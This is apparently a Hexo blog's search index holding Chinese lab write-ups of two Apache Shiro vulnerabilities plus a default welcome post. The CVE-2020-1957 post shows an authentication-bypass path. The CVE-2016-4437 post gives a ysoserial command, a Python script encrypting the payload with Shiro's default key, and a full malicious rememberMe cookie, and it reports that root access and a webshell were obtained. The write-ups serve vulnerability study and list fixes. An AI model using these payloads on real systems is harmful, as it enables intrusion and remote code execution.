<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Shiro认证绕过CVE-2020-1957</title>
    <link href="/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/"/>
    <url>/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="Shiro拦截器"><a href="#Shiro拦截器" class="headerlink" title="Shiro拦截器"></a>Shiro拦截器</h3><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br><br>2.authc为登录拦截器，需要登录认证才能访问的资源。<br></code></pre></td></tr></table></figure><p>用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 &#x2F;index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于&#x2F;user&#x2F;xiaoming 等 &#x2F;user&#x2F;xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[urls]<br>/index.html <span class="hljs-operator">=</span> anon<br>/user/** <span class="hljs-operator">=</span> authc<br></code></pre></td></tr></table></figure><p>Shiro的URL路径表达式为Ant 格式，路径通配符支持?***</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">?：匹配一个字符<br><span class="hljs-comment">*：匹配零个或多个字符串</span><br><span class="hljs-comment">**：匹配路径中的零个或多个路径</span><br></code></pre></td></tr></table></figure><p>这里粗略解释一下，当路径为&#x2F;xxx&#x2F;..和拦截规则里的&#x2F;xxx&#x2F;**匹配成功，通过校验，成功转向后方的Spring Boot . 从而进行了绕过</p><p>其中*表示匹配零个或多个字符串，&#x2F;<em>可以匹配&#x2F;hello，但匹配不到&#x2F;hello&#x2F;因为</em>通配符无法匹配路径。假设&#x2F;hello接口设置了authc拦截器，访问&#x2F;hello将会被进行权限判断，如果请求的URI为&#x2F;hello&#x2F;呢，&#x2F;*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中&#x2F;hello形式和&#x2F;hello&#x2F;形式的URL访问的资源是一样的。</p><h2 id="本实验环境-使用docker完成复现，公网"><a href="#本实验环境-使用docker完成复现，公网" class="headerlink" title="本实验环境 使用docker完成复现，公网"></a>本实验环境 使用docker完成复现，公网</h2><p>这个应用中对URL权限的配置如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> ShiroFilterChainDefinition <span class="hljs-title function_">shiroFilterChainDefinition</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">DefaultShiroFilterChainDefinition</span> <span class="hljs-variable">chainDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultShiroFilterChainDefinition</span>();<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/login.html&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>); <span class="hljs-comment">// need to accept POSTs from the login form</span><br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/logout&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>);<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/admin/**&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>    <span class="hljs-keyword">return</span> chainDefinition;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.访问环境8080端口</p><p><img src="/images/image-20250326154808543.png" alt="image-20250326154808543"></p><p>2.当访问地址&#x2F;admin&#x2F;会被重定向到login.php</p><p><img src="/images/image-20250326154940212.png" alt="image-20250326154940212"></p><p><img src="/images/image-20250326155227524.png" alt="image-20250326155227524"></p><p>3.构造恶意请求&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F; ，绕过权限校验，到达管理员界面</p><p><img src="/images/image-20250326155755134.png" alt="image-20250326155755134"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139</a></p><p>升级1.5.2版本及以上</p><p>修改了requestURI的获取方式，经过更准确的解析获取</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p><a href="https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&u_atoken=0428e47a997e4a01d1ccb7c1af771093&u_asig=0a47314717429912626914864e0099">https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&amp;u_atoken=0428e47a997e4a01d1ccb7c1af771093&amp;u_asig=0a47314717429912626914864e0099</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Shiro-CVE-2016-4437</title>
    <link href="/2025/03/25/Shiro-CVE-2016-4437/"/>
    <url>/2025/03/25/Shiro-CVE-2016-4437/</url>
    
    <content type="html"><![CDATA[<h3 id="Shiro-CVE-2016-4437"><a href="#Shiro-CVE-2016-4437" class="headerlink" title="Shiro-CVE-2016-4437"></a>Shiro-CVE-2016-4437</h3><p>1.目标加入随意字符提交后 bp中带有：Set-Cookie: rememberMe&#x3D;deleteMe字段<img src="/images/image-20250306101153831.png" alt="image-20250306101153831"></p><p>2.ysoserial 生成</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /desktop&quot;</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>生成payload的py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.ser&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(f.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme()   <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rememberMe=atvw7IWDT663MDSftXLkGwRlhRivt+IkfHZ3HuZY1c6wgYaljM<span class="hljs-regexp">/kGC4kgtIoW5pZYpMIt/</span>Kl<span class="hljs-regexp">/Rcgr8PPhwwr5KzSKSq+re8fRyR5AN/</span>XqsCyCcQtxMxrkuWsEld3Ps0NUgTPGTW5xrt6UxtTmxFQzNS2OhIPIQYUpfPIA0vZsLQn7IJ0yeAbEHG5<span class="hljs-regexp">/Kq0Nk9YBehKtsWDNyTEG/</span>hH0d<span class="hljs-regexp">/gXDxxYa6g9MJ3BrpXOSZ3Up48g2i5JfNAfqkSTUMG7EAYw+yaD5ISmnGXvM6jFcLMqcOlGEnwtlky/</span>n2Du6Se+Rxlp4ZJqRB90xMb1I7OQBWDFnEDeKQ7ErCp2jaiw2mqnBv+nK5Wukh4rq6N0NIyehzWg<span class="hljs-regexp">/pUG+8zwgPJrlLFYmqqnX5f3o9/y</span>4M1Nct0GbF0K4zY4VJgHBZDRTTdZOEMgPvpDcupF3ueTht5ERSN79TZWUxr56Pj7<span class="hljs-regexp">/M4WcG/</span>T5wAsOXylq+fJv9orKCS2tUUPeRrnt7eTEq6CqfJgF3aaZq0dkLx5wQEOM2+<span class="hljs-number">89</span>uN87bBBm77I7PLxc3gPckPdQYGvM6gW7nTc6PwsxBQncDwaAbz3EkAL9APlwQ9ZkW5xm3DjY8eYhnkNZXIKM14CiFjv9MZsRHx6x9Vtzdaf52q<span class="hljs-regexp">/xC+MpKczzP41e94YwsjfihH+LHiv8OjGm3Qef+qhO/</span>llkszNrxwaLGYATlm68tNe36SXi5FWqyZUCpNppN4LZwnvDRL4XxEwZSEZ+FwLB9h7OJAW6DTSZbfJqVDcYL8arCwVh4DfI4hqTSoIscP37ZpXJ6P6TtHxu7psg2zxDMR7gMCX01kIdHSHNCeh1LiZIyEd4oqRbEZMoQMnOxrrW1IC5qKq0HERkMX3Exw5GcgQPqnA<span class="hljs-regexp">/bMqp3G6ymejtAV1e2o8qsZe+qALVx1s8k7Esw/i</span>oNBFFCf4XJZk5EInxF90ewUiLe6hRhyMYmyAP9qnKL8Dutbse<span class="hljs-regexp">/YErEP7bdQBRw7J8Nx95iXuahxlM1WMX4TxAeFwOF28sdWvz9drUZoop7CtGkIQ1pJrWFE1BId91KJECchZHoyoSodU5jqxLRJTF9fCn+ltc6pige0DhmT1BFvpZAFg0hb4/</span>YLOHYj4PKheCAVfeimHEhBx8B0q8uo87VP9KPmajgwopqRHv3UGYIqVK1fAj3t<span class="hljs-regexp">/jdrUcU1Fu7wwHjadeayi2MsA7KW4rrinWcY0ZXjtvGUk7vMYAWQt8l+tp3cPAkbk/g</span>8Jwhv66d4ThICGwp94ZoRE7yrRE2wFHU58C+hD2nPtw1bWK2RygIB82bRUzMepyFdK8KaOEm<span class="hljs-regexp">/jALF9zrmqlhX1NZpI0smX7xxqpijRq6XB/</span>YA04cxyNxFSuPXRy6iSlSlirktiG8e5rJ4zTka+U0eVU<span class="hljs-regexp">/h4SJAGuaDUc+RZKcTxE3U/</span><span class="hljs-number">7</span>rNVjL0jI556zfGLKLKEtLQ+VyleSiHP8Ony9tie4oQmOT3i4x0MJTUsrGJKC63DKN6uM+F+HwjGUIUTNkF0LvIOj3xlEj4vKTtjI+oe+<span class="hljs-number">0</span>OInPIRACXl0cBbsE0bDLq7hpJlJeBmodM9NrsJWBeBYIKOU8TsIAFihzoGb<span class="hljs-regexp">/7/</span>UQFdfpuLANKrrF7Ly1XZrJMkPbPIX0zAhmEqxAMYf8zaCeJfYh9UnBFFe2piyd2FAI23W8Xm4PZ<span class="hljs-regexp">/X+DlbSbc2GmCQw+YaLwnRTRtRD7OHAiv9rSh2EHrTcjKVL+HYVczJ7xZjJTHC/i</span>KNLlaIFFR8DdVTx+dHq954EljSpWAb36IJyqmfR7b3pLJDxm4UfU7YbBDrceTpBNKFsUP1U+cIf5w+ZRthmrK7+R+THOH0pdEKLithObP0YVXqN9o6dpTl36Wz93dnAjAjnpTtKKJZlHR1mHPFUxhyNejHLkh6Rb7p99MA1ts9UrCJqufDPJAKy<span class="hljs-regexp">/VbNXW1tHkNHpS15xLmhpid4mvWw3UnBHyTYl7MDuYguWc25vwFm0P4ptHfyFkRMZBmSRFwNfL7GzuT3b0KshSVrYKh3g/</span>hMPZdjctu73jJbdQs5Pn+<span class="hljs-number">9</span>EI8WaobZ831WNxneDIAYj8Yc8WeD1BmKoGSkFVXtYzuAcr5FpIpgjnVmcxH+ZoOldL5YnClZ9jQ9a2n3AJQIiDwstyV8etQWmjtRAhl6OZvYJnUgVzxh8x2tYh2DumEvEQN1YjOiTjZOnh+a7cJHwpPNmpo7s4UH+<span class="hljs-regexp">/rMl7JyDONAsf1pr0u+YTXxXr5rS8WVfb9QS61IJB4xqttn0TAifUzzwcFpg4+QS+WpaKOwwQtV68+ph5k8wh8rNfC2VE5qdXHiUsPquDCuU7zzZyWXPZq/y</span>hH1Nwoe1Ri7ZL3hsJOikW<span class="hljs-regexp">/y+C7TaeIPnCSiuHaO/</span>P8IVSwdeqEMEhMNmGRAlKxdmFuSloeQXJ8g<span class="hljs-regexp">/+YmwhS+lWxsIOyypbyxF6MEyT4XG4MQBrHyqWaKO63ktlDP5oln7Wg1JQdQAzR1dzm2t4ZeOmKkulRjBHbBz96RPXdjq45vpg2CR2KFg7YG02n0DPrxs3KqZUQ6WnWfOhQVfg02SZw+WpjxvwjpXou/</span>KMX4y8aoGUPI0fxmrz0dzS51MIzk2tIfrmpWIruZcgTIl3N6qplVYReEA<span class="hljs-regexp">/rhqK5dSLPIvVpKSLYl/</span>e+K6FS8tQzIKV<span class="hljs-regexp">/+j3RXmQF5aSct8ALwOgyAwUtfZAK2Rro7b+sGriqzvdPj6+DmM0rHOTixO4h1uJA7WEzp8LDVQrifZcqdSUHKWwSKlay2qKj6nwd3M2snwEiPT0hXKmNjdDYAnmSAdmx2bdoK3TcPjyHtJdpJeaThliVWP/</span>sJUZlE2bcysdwuq<span class="hljs-regexp">/JUiORWKEm1qyElKJYZiSLKLojhWRX0wUu0QYNjOhK+fvXl75C/</span>eSNi7xHUWDGdfBIDvvgToNSywRN0ql9hQGJ<span class="hljs-regexp">/HcKmnDbYb/</span>CCRmPWdBeMs8tAP9L8aSp0EGHKgwXtT8x54eUdJ3nn<span class="hljs-regexp">/zGl7N+Dbn8JmDu5F/</span>KrNLHuOgB7m<span class="hljs-regexp">/jBXj/</span>Z<span class="hljs-regexp">/w+mydEo7cvwmhAZtf51eY6qEpmjtgPwuhm7PVKL10Laa37j4SE0rnP+D0+6tj2mgd7P90zV5VGpaiwgg+yT5Mr8dKipKLuef9Gd02xopfSLihtloU36MvLgmtNg5C2rsKu/</span>ZZFSVHYrKfHYQNLmLugxfquGJ0Sdu<span class="hljs-regexp">/h/</span><span class="hljs-number">74</span>oRlCClWoV+rNwLahkrlHjTMl0bfbvCnrvGK17r7m9XI19wGDs7fBo+y9UXNBIXrMTnbyhpKrsTqBOYcEANDWCOcSc9XauJgci<span class="hljs-regexp">//</span>RMlhDPwALStugCGBTj+<span class="hljs-number">9</span>vTsOrdcs6ybyXHctq8GxanFl57acLh1+<span class="hljs-number">55</span>IhKC8A05pXnqqoCBRdyT6O218<span class="hljs-regexp">/IqN/</span>+a+XKZgY2cf6TpmQn3BNs+m+HduMhLB338uCxuDLahxJ3<span class="hljs-regexp">/3zp2YSOn5uUymh4diSVW4SAV1Hjy+zSZwSbg5wnbN4v7R84/</span>Dk6MXUZd1ubi27uFsyjO066B3WQJN3bw<span class="hljs-regexp">/80FsuwFXqbvwJ7iaSgons6fKY2XCkH7aCfsM4A0MZDVx+GO6VM+X5j8l9IjE7w0PlLF/</span>zX9kMr0ocdr/EXNfDaE2TPSNwZDFhQjiTiht4huYswOb+Wa7iwkq0TUI7wB5qtq+qetfrODJhkQikuJaC1w18eMeRggm9slcshCLerKM3uZlXVVw7bXu+i4AI9au48+GqYbUnrtSnW+P0jfB0qBfhr1Jl3jbRI2FyfezYTbiIghK8oZ2KSVPwdooELG5mxSaIfAJ7s1+lOVoYxTscI2H4nh5if2nPHkFvM5odrKAaGgo1jg==<br></code></pre></td></tr></table></figure><p>3.在Cookie处填入payload!<img src="/images/image-20250306112846388.png" alt="image-20250306112846388"></p><p>4.shiro利用工具 权限为root</p><p><img src="/images/image-20250306115621653.png" alt="image-20250306115621653"></p><p>执行内存马</p><p><img src="/images/image-20250306120252462.png" alt="image-20250306120252462"></p><p>冰蝎连接上</p><p><img src="/images/image-20250306120324856.png" alt="image-20250306120324856"></p><p>5.漏洞修复</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Shiro版本&gt;<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">2</span>.修改密钥<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/11/hello-world/"/>
    <url>/2025/03/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
